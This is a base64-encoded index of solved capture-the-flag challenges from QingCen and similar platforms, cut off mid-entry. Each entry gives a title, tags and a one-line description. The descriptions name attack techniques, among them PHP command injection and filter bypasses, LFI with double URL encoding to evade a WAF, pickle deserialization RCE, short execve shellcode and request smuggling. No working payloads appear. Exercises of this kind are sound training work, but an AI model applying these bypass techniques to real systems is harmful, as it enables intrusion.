ZGF0ZTogXCIyMDI2LTAyLTEyXCIsXHJcbiAgfSxcclxuICB7XHJcbiAgICBpZDogMzA2LFxyXG4gICAgdGl0bGU6IFwiUUMgZXpjbWRfNiBcdTIwMTQgZXZhbFx1NjI2N1x1ODg0Q1wiLFxyXG4gICAgc2x1ZzogXCJxYy1lemNtZC02XCIsXHJcbiAgICBjYXRlZ29yeTogXCJjbWRcIixcclxuICAgIHBsYXRmb3JtOiBcIlFpbmdDZW5cIixcclxuICAgIGRpZmZpY3VsdHk6IFwiTWVkaXVtXCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiUkNFXCIsIFwiZXZhbFwiLCBcIlBIUFwiXSxcclxuICAgIGRlc2NyaXB0aW9uOiBcImV2YWxcdTZDRThcdTUxNjVcdTYyNjdcdTg4NENcdTdDRkJcdTdFREZcdTU0N0RcdTRFRTRcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMi0xMlwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDMwNyxcclxuICAgIHRpdGxlOiBcIlFDIGV6Y21kXzcgXHUyMDE0IFx1NUI1N1x1N0IyNlx1NEUzMlx1NjJGQ1x1NjNBNVwiLFxyXG4gICAgc2x1ZzogXCJxYy1lemNtZC03XCIsXHJcbiAgICBjYXRlZ29yeTogXCJjbWRcIixcclxuICAgIHBsYXRmb3JtOiBcIlFpbmdDZW5cIixcclxuICAgIGRpZmZpY3VsdHk6IFwiTWVkaXVtXCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiUkNFXCIsIFwiY29uY2F0XCIsIFwiUEhQXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiXHU1QjU3XHU3QjI2XHU0RTMyXHU2MkZDXHU2M0E1XHU3RUQ1XHU4RkM3XHU1MTczXHU5NTJFXHU4QkNEXHU4RkM3XHU2RUU0XCIsXHJcbiAgICBkYXRlOiBcIjIwMjYtMDItMTNcIixcclxuICB9LFxyXG4gIHtcclxuICAgIGlkOiAzMDgsXHJcbiAgICB0aXRsZTogXCJRQyBlemNtZF84IFx1MjAxNCBwYXNzdGhydVwiLFxyXG4gICAgc2x1ZzogXCJxYy1lemNtZC04XCIsXHJcbiAgICBjYXRlZ29yeTogXCJjbWRcIixcclxuICAgIHBsYXRmb3JtOiBcIlFpbmdDZW5cIixcclxuICAgIGRpZmZpY3VsdHk6IFwiTWVkaXVtXCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiUkNFXCIsIFwicGFzc3RocnVcIiwgXCJQSFBcIl0sXHJcbiAgICBkZXNjcmlwdGlvbjogXCJwYXNzdGhydVx1NTFGRFx1NjU3MFx1NjI2N1x1ODg0Q1x1NTQ3RFx1NEVFNFwiLFxyXG4gICAgZGF0ZTogXCIyMDI2LTAyLTEzXCIsXHJcbiAgfSxcclxuICB7XHJcbiAgICBpZDogMzA5LFxyXG4gICAgdGl0bGU6IFwiUUMgZXpjbWRfOSBcdTIwMTQgdGFiXHU3RUQ1XHU4RkM3XCIsXHJcbiAgICBzbHVnOiBcInFjLWV6Y21kLTlcIixcclxuICAgIGNhdGVnb3J5OiBcImNtZFwiLFxyXG4gICAgcGxhdGZvcm06IFwiUWluZ0NlblwiLFxyXG4gICAgZGlmZmljdWx0eTogXCJNZWRpdW1cIixcclxuICAgIHNvbHZlZDogdHJ1ZSxcclxuICAgIGZpcnN0Qmxvb2Q6IGZhbHNlLFxyXG4gICAgcG9pbnRzOiAxMDAsXHJcbiAgICB0YWdzOiBbXCJSQ0VcIiwgXCJ0YWJcIiwgXCJieXBhc3NcIl0sXHJcbiAgICBkZXNjcmlwdGlvbjogXCJ0YWJcdTVCNTdcdTdCMjZcdTdFRDVcdThGQzdcdTdBN0FcdTY4M0NcdThGQzdcdTZFRTRcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMi0xNFwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDMxMCxcclxuICAgIHRpdGxlOiBcIlFDIGV6Y21kXzEwIFx1MjAxNCBcdTZFOTBcdTc4MDFcdTZDQzRcdTk3MzIgXHUyNjA1XHU0RTAwXHU4ODQwXCIsXHJcbiAgICBzbHVnOiBcInFjLWV6Y21kLTEwXCIsXHJcbiAgICBjYXRlZ29yeTogXCJjbWRcIixcclxuICAgIHBsYXRmb3JtOiBcIlFpbmdDZW5cIixcclxuICAgIGRpZmZpY3VsdHk6IFwiSGFyZFwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcIlJDRVwiLCBcInNvdXJjZS1sZWFrXCIsIFwiZmlyc3QtYmxvb2RcIl0sXHJcbiAgICBkZXNjcmlwdGlvbjogXCJQSFAgPz5cdTk1RURcdTU0MDhcdTY4MDdcdTdCN0VcdTZDQzRcdTk3MzJcdTZFOTBcdTc4MDFcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMi0xNFwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDMxMSxcclxuICAgIHRpdGxlOiBcIlFDIGV6Y21kXzExIFx1MjAxNCBcdTZFOTBcdTc4MDFcdTZDQzRcdTk3MzIgXHUyNjA1XHU0RTAwXHU4ODQwXCIsXHJcbiAgICBzbHVnOiBcInFjLWV6Y21kLTExXCIsXHJcbiAgICBjYXRlZ29yeTogXCJjbWRcIixcclxuICAgIHBsYXRmb3JtOiBcIlFpbmdDZW5cIixcclxuICAgIGRpZmZpY3VsdHk6IFwiSGFyZFwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcIlJDRVwiLCBcInNvdXJjZS1sZWFrXCIsIFwiZmlyc3QtYmxvb2RcIl0sXHJcbiAgICBkZXNjcmlwdGlvbjogXCJyZWFkZmlsZVx1NkNDNFx1OTczMmZsYWcucGhwXCIsXHJcbiAgICBkYXRlOiBcIjIwMjYtMDItMTVcIixcclxuICB9LFxyXG4gIHtcclxuICAgIGlkOiA0MDEsXHJcbiAgICB0aXRsZTogXCJRQyBYMHIgXHUyMDE0IFhPUlx1ODlFM1x1NUJDNlwiLFxyXG4gICAgc2x1ZzogXCJxYy14MHJcIixcclxuICAgIGNhdGVnb3J5OiBcInJldmVyc2VcIixcclxuICAgIHBsYXRmb3JtOiBcIlFpbmdDZW5cIixcclxuICAgIGRpZmZpY3VsdHk6IFwiRWFzeVwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcIlhPUlwiLCBcInJldmVyc2VcIl0sXHJcbiAgICBkZXNjcmlwdGlvbjogXCJcdTUzQ0NcdTVDNDJYT1JcdTkwMDZcdTU0MTFcdTg5RTNcdTVCQzZcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMi0yMFwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDQwMixcclxuICAgIHRpdGxlOiBcIlFDIFB3bidzIERvb3IgXHUyMDE0IFx1OTAwNlx1NTQxMVx1NUJDNlx1NzgwMVwiLFxyXG4gICAgc2x1ZzogXCJxYy1wd24tZG9vclwiLFxyXG4gICAgY2F0ZWdvcnk6IFwicmV2ZXJzZVwiLFxyXG4gICAgcGxhdGZvcm06IFwiUWluZ0NlblwiLFxyXG4gICAgZGlmZmljdWx0eTogXCJFYXN5XCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wicmV2ZXJzZVwiLCBcInBhc3N3b3JkXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiXHU5MDA2XHU1NDExXHU1MjA2XHU2NzkwXHU1QkM2XHU3ODAxXHU3Qjk3XHU2Q0Q1IDB4NmI2NTc5XCIsXHJcbiAgICBkYXRlOiBcIjIwMjYtMDItMjBcIixcclxuICB9LFxyXG4gIHtcclxuICAgIGlkOiA0MDMsXHJcbiAgICB0aXRsZTogXCJRQyBpbnB1dF9mdW5jdGlvbiBcdTIwMTQgU2hlbGxjb2RlIFx1MjYwNVx1NEUwMFx1ODg0MFwiLFxyXG4gICAgc2x1ZzogXCJxYy1pbnB1dC1mdW5jdGlvblwiLFxyXG4gICAgY2F0ZWdvcnk6IFwicHduXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJRaW5nQ2VuXCIsXHJcbiAgICBkaWZmaWN1bHR5OiBcIkhhcmRcIixcclxuICAgIHNvbHZlZDogdHJ1ZSxcclxuICAgIGZpcnN0Qmxvb2Q6IGZhbHNlLFxyXG4gICAgcG9pbnRzOiAxMDAsXHJcbiAgICB0YWdzOiBbXCJzaGVsbGNvZGVcIiwgXCJwd25cIiwgXCJmaXJzdC1ibG9vZFwiXSxcclxuICAgIGRlc2NyaXB0aW9uOiBcIjIzXHU1QjU3XHU4MjgyZXhlY3ZlKFxcXCIvYmluL3NoXFxcIikgc2hlbGxjb2RlXHU3RjE2XHU1MTk5XCIsXHJcbiAgICBkYXRlOiBcIjIwMjYtMDItMjJcIixcclxuICB9LFxyXG4gIHtcclxuICAgIGlkOiA1MDEsXHJcbiAgICB0aXRsZTogXCJRaW5nQ2VuICM3MzMgXHUyMDE0IERpYXJ5IEFwcCAoXHU2NUY2XHU1RThGK1NRTGkrUGlja2xlK1hYRSlcIixcclxuICAgIHNsdWc6IFwicWluZ2Nlbi03MzMtZGlhcnlcIixcclxuICAgIGNhdGVnb3J5OiBcIndlYlwiLFxyXG4gICAgcGxhdGZvcm06IFwiUWluZ0NlblwiLFxyXG4gICAgZGlmZmljdWx0eTogXCJIYXJkXCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1widGltaW5nLWF0dGFja1wiLCBcIlNRTGlcIiwgXCJwaWNrbGVcIiwgXCJYWEVcIiwgXCJyYWNlLWNvbmRpdGlvblwiXSxcclxuICAgIGRlc2NyaXB0aW9uOiBcIkZsYXNrXHU2NUU1XHU4QkIwXHU1RTk0XHU3NTI4XHU1OTFBXHU5NjM2XHU2QkI1XHU2RTE3XHU5MDBGXHVGRjFBXHU2NUY2XHU1RThGXHU2NTNCXHU1MUZCXHUyMTkyU1FMXHU2Q0U4XHU1MTY1XHUyMTkyUGlja2xlIFJDRVx1MjE5MlhYRVwiLFxyXG4gICAgZGF0ZTogXCIyMDI2LTAzLTE1XCIsXHJcbiAgfSxcclxuICB7XHJcbiAgICBpZDogNTAyLFxyXG4gICAgdGl0bGU6IFwiUWluZ0NlbiAjNzQ3IFx1MjAxNCBQSFAgTEZJIEZpbHRlciBCeXBhc3NcIixcclxuICAgIHNsdWc6IFwicWluZ2Nlbi03NDctbGZpXCIsXHJcbiAgICBjYXRlZ29yeTogXCJ3ZWJcIixcclxuICAgIHBsYXRmb3JtOiBcIlFpbmdDZW5cIixcclxuICAgIGRpZmZpY3VsdHk6IFwiTWVkaXVtXCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiTEZJXCIsIFwicGhwLWZpbHRlclwiLCBcImJ5cGFzc1wiLCBcImVuY29kaW5nXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiUEhQIExGSVx1OEZDN1x1NkVFNFx1N0VENVx1OEZDN1x1RkYxQVx1NTkyN1x1NUMwRlx1NTE5OStVUkxcdTdGMTZcdTc4MDFcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMy0xOFwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDUwMyxcclxuICAgIHRpdGxlOiBcIlFpbmdDZW4gIzczNCBcdTIwMTQgUmFjZSBDb25kaXRpb25cIixcclxuICAgIHNsdWc6IFwicWluZ2Nlbi03MzQtcmFjZVwiLFxyXG4gICAgY2F0ZWdvcnk6IFwid2ViXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJRaW5nQ2VuXCIsXHJcbiAgICBkaWZmaWN1bHR5OiBcIk1lZGl1bVwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcInJhY2UtY29uZGl0aW9uXCIsIFwiVE9DVE9VXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiXHU3QURFXHU2MDAxXHU2NzYxXHU0RUY2XHU1OTFBXHU2QjIxXHU1MTUxXHU2MzYyXCIsXHJcbiAgICBkYXRlOiBcIjIwMjYtMDMtMjBcIixcclxuICB9LFxyXG4gIHtcclxuICAgIGlkOiA1MDQsXHJcbiAgICB0aXRsZTogXCJQaWNrbGUgRGVzZXJpYWxpemF0aW9uIFJDRVwiLFxyXG4gICAgc2x1ZzogXCJwaWNrbGUtcmNlXCIsXHJcbiAgICBjYXRlZ29yeTogXCJwd25cIixcclxuICAgIHBsYXRmb3JtOiBcIlFpbmdDZW5cIixcclxuICAgIGRpZmZpY3VsdHk6IFwiSGFyZFwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcInBpY2tsZVwiLCBcImRlc2VyaWFsaXphdGlvblwiLCBcIlJDRVwiXSxcclxuICAgIGRlc2NyaXB0aW9uOiBcIlB5dGhvbiBQaWNrbGVcdTUzQ0RcdTVFOEZcdTUyMTdcdTUzMTZSQ0VcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wNC0xMFwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDUwNSxcclxuICAgIHRpdGxlOiBcIkhUVFAgUmVxdWVzdCBTbXVnZ2xlXCIsXHJcbiAgICBzbHVnOiBcImh0dHAtc211Z2dsZVwiLFxyXG4gICAgY2F0ZWdvcnk6IFwid2ViXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJRaW5nQ2VuXCIsXHJcbiAgICBkaWZmaWN1bHR5OiBcIkhhcmRcIixcclxuICAgIHNvbHZlZDogZmFsc2UsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiSFRUUC1zbXVnZ2xlXCIsIFwiQ0wtVEVcIl0sXHJcbiAgICBkZXNjcmlwdGlvbjogXCJDTC1URVx1OEJGN1x1NkM0Mlx1OEQ3MFx1NzlDMVwiLFxyXG4gICAgZGF0ZTogXCIyMDI2LTAzLTE2XCIsXHJcbiAgfSxcclxuICB7XHJcbiAgICBpZDogNTA2LFxyXG4gICAgdGl0bGU6IFwiY3RmLnNob3cgTG9jayBcdTIwMTQgSE1BQ1x1N0I3RVx1NTQwRFwiLFxyXG4gICAgc2x1ZzogXCJjdGZzaG93LWxvY2tcIixcclxuICAgIGNhdGVnb3J5OiBcImNyeXB0b1wiLFxyXG4gICAgcGxhdGZvcm06IFwiY3RmLnNob3dcIixcclxuICAgIGRpZmZpY3VsdHk6IFwiTWVkaXVtXCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiSE1BQ1wiLCBcImhhc2hcIiwgXCJzaWduYXR1cmVcIl0sXHJcbiAgICBkZXNjcmlwdGlvbjogXCJITUFDXHU3QjdFXHU1NDBEXHU3ODM0XHU4OUUzXCIsXHJcbiAgICBkYXRlOiBcIjIwMjYtMDQtMDJcIixcclxuICB9LFxyXG4gIHtcclxuICAgIGlkOiAwLFxyXG4gICAgdGl0bGU6IFwiXHU0RkUxXHU2MDZGXHU2NTM2XHU5NkM2XHU0RTBFXHU2Q0M0XHU5NzMyXCIsXHJcbiAgICBzbHVnOiBcIndyaXRldXAtaW5mb2xlYWtcIixcclxuICAgIGNhdGVnb3J5OiBcImluZm9sZWFrXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJDVEZTaG93IC8gUWluZ0NlblwiLFxyXG4gICAgZGlmZmljdWx0eTogXCJFYXN5XCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiSFRNTFwiLCBcIkNvb2tpZVwiLCBcIkpXVFwiLCBcInJvYm90cy50eHRcIiwgXCJMRklcIiwgXCJJRE9SXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiSFRNTFx1NkNFOFx1OTFDQVx1MzAwMVx1NTRDRFx1NUU5NFx1NTkzNFx1MzAwMTMwMlx1NTRDRFx1NUU5NFx1NEY1M1x1MzAwMXJvYm90cy50eHRcdTMwMDEucGhwc1x1MzAwMUNvb2tpZSBJRE9SXHUzMDAxL3Byb2Mvc2VsZi9mZFx1MzAwMUxGSVx1OERFRlx1NUY4NFx1N0E3Rlx1OEQ4QVwiLFxyXG4gICAgZGF0ZTogXCIyMDI2LTAxLTE1XCIsXHJcbiAgfSxcclxuICB7XHJcbiAgICBpZDogMCxcclxuICAgIHRpdGxlOiBcIlBIUCBcdTVGMzFcdTdDN0JcdTU3OEJcdTdFRDVcdThGQzdcIixcclxuICAgIHNsdWc6IFwid3JpdGV1cC1waHBcIixcclxuICAgIGNhdGVnb3J5OiBcInBocFwiLFxyXG4gICAgcGxhdGZvcm06IFwiUWluZ0NlbiAvIElTQ0NcIixcclxuICAgIGRpZmZpY3VsdHk6IFwiRWFzeVwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcIlBIUFwiLCBcIndlYWstdHlwZVwiLCBcIjBlLU1ENVwiLCBcImFycmF5X3NlYXJjaFwiLCBcInZhcmlhYmxlLW92ZXJ3cml0ZVwiXSxcclxuICAgIGRlc2NyaXB0aW9uOiBcIlBIUCA9PSBcdTVGMzFcdTZCRDRcdThGODNcdTMwMDEwZSBNRDVcdTc4QjBcdTY0OUVcdTMwMDFhcnJheV9zZWFyY2hcdTZGMEZcdTZEMUVcdTMwMDFcdTUzRDhcdTkxQ0ZcdTg5ODZcdTc2RDZcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMi0wNVwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDAsXHJcbiAgICB0aXRsZTogXCJcdTU0N0RcdTRFRTRcdTZDRThcdTUxNjVcdTRFMEVSQ0VcIixcclxuICAgIHNsdWc6IFwid3JpdGV1cC1jbWRcIixcclxuICAgIGNhdGVnb3J5OiBcImNtZFwiLFxyXG4gICAgcGxhdGZvcm06IFwiUWluZ0NlblwiLFxyXG4gICAgZGlmZmljdWx0eTogXCJNZWRpdW1cIixcclxuICAgIHNvbHZlZDogdHJ1ZSxcclxuICAgIGZpcnN0Qmxvb2Q6IGZhbHNlLFxyXG4gICAgcG9pbnRzOiAxMDAsXHJcbiAgICB0YWdzOiBbXCJSQ0VcIiwgXCJjb21tYW5kLWluamVjdGlvblwiLCBcIm5vLWFscGhhXCIsIFwiSUZTXCIsIFwiYnlwYXNzXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiXHU1MjA2XHU1M0Y3XHU2Q0U4XHU1MTY1XHUzMDAxSUZTXHU3RUQ1XHU4RkM3XHUzMDAxXHU2NUUwXHU1QjU3XHU2QkNEUkNFXHUzMDAxZXZhbFx1NjI2N1x1ODg0Q1x1MzAwMVx1NUI1N1x1N0IyNlx1NEUzMlx1NjJGQ1x1NjNBNVx1MzAwMXBhc3N0aHJ1XCIsXHJcbiAgICBkYXRlOiBcIjIwMjYtMDItMTZcIixcclxuICB9LFxyXG4gIHtcclxuICAgIGlkOiAwLFxyXG4gICAgdGl0bGU6IFwiUFdOIFx1NEUwRVx1OTAwNlx1NTQxMVwiLFxyXG4gICAgc2x1ZzogXCJ3cml0ZXVwLXB3blwiLFxyXG4gICAgY2F0ZWdvcnk6IFwicHduXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJRaW5nQ2VuXCIsXHJcbiAgICBkaWZmaWN1bHR5OiBcIkhhcmRcIixcclxuICAgIHNvbHZlZDogdHJ1ZSxcclxuICAgIGZpcnN0Qmxvb2Q6IGZhbHNlLFxyXG4gICAgcG9pbnRzOiAxMDAsXHJcbiAgICB0YWdzOiBbXCJYT1JcIiwgXCJyZXZlcnNlXCIsIFwic2hlbGxjb2RlXCIsIFwicHduXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiWE9SXHU4OUUzXHU1QkM2XHUzMDAxXHU5MDA2XHU1NDExXHU1QkM2XHU3ODAxXHU3Qjk3XHU2Q0Q1XHUzMDAxMjNcdTVCNTdcdTgyODJleGVjdmUgc2hlbGxjb2RlXCIsXHJcbiAgICBkYXRlOiBcIjIwMjYtMDItMjNcIixcclxuICB9LFxyXG4gIHtcclxuICAgIGlkOiAwLFxyXG4gICAgdGl0bGU6IFwiXHU5NjkwXHU1MTk5XHU2NzJGXHU0RTBFXHU1MkEwXHU1QkM2XCIsXHJcbiAgICBzbHVnOiBcIndyaXRldXAtc3RlZ29cIixcclxuICAgIGNhdGVnb3J5OiBcInN0ZWdvXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJDVEZTaG93XCIsXHJcbiAgICBkaWZmaWN1bHR5OiBcIk1lZGl1bVwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcInN0ZWdvXCIsIFwiemVyby13aWR0aFwiLCBcIkVYSUZcIiwgXCJCYXNlMTAwXCIsIFwiemlwXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiXHU5NkY2XHU1QkJEXHU1QjU3XHU3QjI2XHU5NjkwXHU1MTk5XHUzMDAxRVhJRlx1NEUwOVx1NUM0MkJhc2U2NFx1MzAwMVpJUFx1NTkxQVx1OTFDRFx1NUJDNlx1NzgwMVx1NzgzNFx1ODlFM1wiLFxyXG4gICAgZGF0ZTogXCIyMDI2LTAzLTAxXCIsXHJcbiAgfSxcclxuICB7XHJcbiAgICBpZDogMCxcclxuICAgIHRpdGxlOiBcIlx1Njc0Mlx1OTg3OVx1NEUwRVx1N0VGQ1x1NTQwOFwiLFxyXG4gICAgc2x1ZzogXCJ3cml0ZXVwLW1pc2NcIixcclxuICAgIGNhdGVnb3J5OiBcIm1pc2NcIixcclxuICAgIHBsYXRmb3JtOiBcIlx1NTkxQVx1NUU3M1x1NTNGMFwiLFxyXG4gICAgZGlmZmljdWx0eTogXCJNZWRpdW1cIixcclxuICAgIHNvbHZlZDogdHJ1ZSxcclxuICAgIGZpcnN0Qmxvb2Q6IGZhbHNlLFxyXG4gICAgcG9pbnRzOiAxMDAsXHJcbiAgICB0YWdzOiBbXCJMRklcIiwgXCJTU1JGXCIsIFwidmFyaWFibGUtb3ZlcndyaXRlXCIsIFwibWlzY1wiXSxcclxuICAgIGRlc2NyaXB0aW9uOiBcIkxGSVx1OERFRlx1NUY4NFx1N0E3Rlx1OEQ4QVx1MzAwMVNTUkZcdTU5MUFcdTUzNEZcdThCQUVcdTMwMDFcdTUzRDhcdTkxQ0ZcdTg5ODZcdTc2RDZcdTMwMDFDVEZIdWJcdTVGNjlcdTg2Q0JcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMy0wNVwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDAsXHJcbiAgICB0aXRsZTogXCJDVEYgXHU1REU1XHU1MTc3XHU0RjdGXHU3NTI4XHU2MzA3XHU1MzU3XCIsXHJcbiAgICBzbHVnOiBcIndyaXRldXAtdG9vbHNcIixcclxuICAgIGNhdGVnb3J5OiBcInRvb2xzXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJcdTkwMUFcdTc1MjhcIixcclxuICAgIGRpZmZpY3VsdHk6IFwiRWFzeVwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcIklEQVwiLCBcIkJ1cnBcIiwgXCJHREJcIiwgXCJwd250b29sc1wiLCBcInRvb2xzXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiSURBIFByb1x1MzAwMUJ1cnAgU3VpdGVcdTMwMDFHREIvUHduZGJnXHUzMDAxUHdudG9vbHNcdTRGN0ZcdTc1MjhcdTY1NTlcdTdBMEJcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMS0wNVwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDAsXHJcbiAgICB0aXRsZTogXCIyMDI2XHU1RTc0NVx1NjcwOFx1N0VGQ1x1NTQwOFdyaXRldXBcIixcclxuICAgIHNsdWc6IFwid3JpdGV1cC1tYXkyMDI2XCIsXHJcbiAgICBjYXRlZ29yeTogXCJ3ZWJcIixcclxuICAgIHBsYXRmb3JtOiBcIklTQ0MgLyBRaW5nQ2VuIC8gQ1RGU2hvd1wiLFxyXG4gICAgZGlmZmljdWx0eTogXCJIYXJkXCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiSldUXCIsIFwiU1NUSVwiLCBcIlNTUkZcIiwgXCJYWEVcIiwgXCJmaWxlLXVwbG9hZFwiLCBcInJhY2UtY29uZGl0aW9uXCIsIFwiZGVzZXJpYWxpemF0aW9uXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiSVNDQyBKV1RcdTRGMkFcdTkwMjBcdTMwMDFcdTk3NTJcdTVDOTExMjBcdTk4OThcdTUxNjhcdTkwMUFcdTUxNzNcdTRFMDBcdTg4NDBcdTMwMDFDVEZTaG93IHdlYjExXHUzMDAxUGFzc0tleSBUT0NUT1VcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wNS0wNlwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDkwOCxcclxuICAgIHRpdGxlOiBcImV6aW5mb2xlYWsgXHUyMDE0IFBIUCBMRkkgXHU1M0NDXHU5MUNEVVJMXHU3RjE2XHU3ODAxV0FGXHU3RUQ1XHU4RkM3XCIsXHJcbiAgICBzbHVnOiBcInFpbmdjZW4tZXppbmZvbGVha1wiLFxyXG4gICAgY2F0ZWdvcnk6IFwid2ViXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJRaW5nQ2VuXCIsXHJcbiAgICBkaWZmaWN1bHR5OiBcIk1lZGl1bVwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDM0NCxcclxuICAgIHRhZ3M6IFtcIkxGSVwiLCBcInBocC1maWx0ZXJcIiwgXCJXQUYtYnlwYXNzXCIsIFwiZG91YmxlLXVybC1lbmNvZGVcIiwgXCJyb3QxM1wiXSxcclxuICAgIGRlc2NyaXB0aW9uOiBcIlBIUFx1NjU4N1x1NEVGNlx1NTMwNVx1NTQyQlx1NkYwRlx1NkQxRVx1RkYwQ1x1OTAxQVx1OEZDN1x1NTNDQ1x1OTFDRFVSTFx1N0YxNlx1NzgwMVx1N0VENVx1OEZDN1dBRlx1RkYwQ3JvdDEzIGZpbHRlclx1N0VENVx1OEZDN1x1OEY5M1x1NTFGQVx1OEZDN1x1NkVFNFx1RkYwQ1x1OEJGQlx1NTNENmZsYWdcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wNi0yNFwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDgwMSxcclxuICAgIHRpdGxlOiBcImxpdF9wdWphaWxfcmVhZGVyIFx1MjAxNCBQeXRob24gUHlqYWlsIFx1NUI1N1x1N0IyNlx1NEUzMlx1NTNDRFx1OEY2Q1x1OUE4Q1x1OEJDMVx1N0VENVx1OEZDN1wiLFxyXG4gICAgc2x1ZzogXCJxaW5nY2VuLWxpdC1wdWphaWwtcmVhZGVyXCIsXHJcbiAgICBjYXRlZ29yeTogXCJtaXNjXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJRaW5nQ2VuXCIsXHJcbiAgICBkaWZmaWN1bHR5OiBcIkVhc3lcIixcclxuICAgIHNvbHZlZDogdHJ1ZSxcclxuICAgIGZpcnN0Qmxvb2Q6IGZhbHNlLFxyXG4gICAgcG9pbnRzOiAzNDQsXHJcbiAgICB0YWdzOiBbXCJweWphaWxcIiwgXCJzb2NrZXRcIiwgXCJzdHJpbmctcmV2ZXJzZVwiLCBcI